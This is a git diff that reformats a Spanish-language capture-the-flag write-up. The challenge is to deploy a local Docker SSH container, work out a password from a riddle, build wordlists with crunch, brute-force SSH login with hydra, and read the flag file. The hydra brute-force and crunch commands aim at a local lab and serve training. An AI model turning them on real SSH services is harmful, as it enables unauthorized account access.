@@ -53,30 +53,34 @@ Herramientas utilizadas: Crunch, Hydra, SSH, Docker.
 A. Obtención y transferencia del laboratorio
 Descargar desde el repositorio de trabajo el paquete del reto.
 
-Transferir el archivo comprimido al entorno Kali Linux con:
+- Transferir el archivo comprimido al entorno Kali Linux con:
 
-bash
+```bash
 scp usuario@host:~/Descargas/reto-legion.zip ~/reto/
+```
 Descomprimir y ubicar los archivos necesarios:
 
-bash
+```bash
 unzip reto-legion.zip
 cd reto-legion/
+```
 B. Instalación y despliegue del contenedor
 Instalar Docker si es necesario:
 
-bash
+```bash
 sudo apt update && sudo apt install docker.io
+```
 Ejecutar el contenedor exponiendo el puerto SSH:
 
-bash
+```bash
 docker run -d -p 2222:22 --name ctf-legion ubuntu-ssh-retocftf:latest
+```
 Verificar estado del contenedor y la red Docker:
 
-bash
+```bash
 docker ps
 ip a
-
+```
 ## :four: Resolución de la Contraseña a través de Enigmas
 El reto presenta un acertijo en el que cada línea aporta indicios sobre una letra de la contraseña, todas relacionadas con palabras clave específicas. El análisis cuidadoso de cada pista permite construir el posible password, valorando sinónimos, fonética y posiciones en palabras dadas.
 
@@ -95,21 +99,27 @@ De este modo, se construye una contraseña probable que se verificará experimen
 ## :five: Generación de Diccionarios con Crunch
 Para abarcar variantes de la contraseña, se crea un diccionario adaptado con reglas impuestas por el acertijo:
 
-bash
+```bash
 crunch 5 5 -t E@@G* -o posibles.txt
+```
+
 -t E@@G* define una máscara que varía posiciones intermedias y añade flexibilidad a la búsqueda.
 
 O bien, para cubrir combinaciones alfabéticas:
 
-bash
+```bash
 crunch 5 5 -f /usr/share/crunch/charset.lst alpha -o lista-completa.txt
+```
+
 Se recomienda personalizar la máscara para enfocarse en posibles letras identificadas en el análisis del acertijo.
 
 ## :six: Ataque de Fuerza Bruta con Hydra
 Una vez listo el diccionario, se ejecuta Hydra para automatizar el ataque contra SSH, empleando el usuario objetivo y el archivo de contraseñas:
 
-bash
+```bash
 hydra -l legion -P posibles.txt ssh://localhost -s 2222
+```
+
 Donde:
 
 -l legion define el usuario a atacar.
@@ -123,13 +133,15 @@ Se espera que Hydra muestre el intento exitoso indicando la contraseña válida 
 ## :seven: Acceso SSH y Obtención de la Bandera
 Con la contraseña obtenida, se accede al contenedor:
 
-bash
+```bash
 ssh legion@localhost -p 2222
+```
 Una vez en la terminal remota, se navega para encontrar la flag o el archivo de validación del reto:
 
-bash
+```bash
 ls
 cat flag.txt
+```
 
 ## :eight: Recomendaciones y Buenas Prácticas
 Documentar claramente cada comando y hallazgo relevante para asegurar la trazabilidad y facilitar auditorías externas.
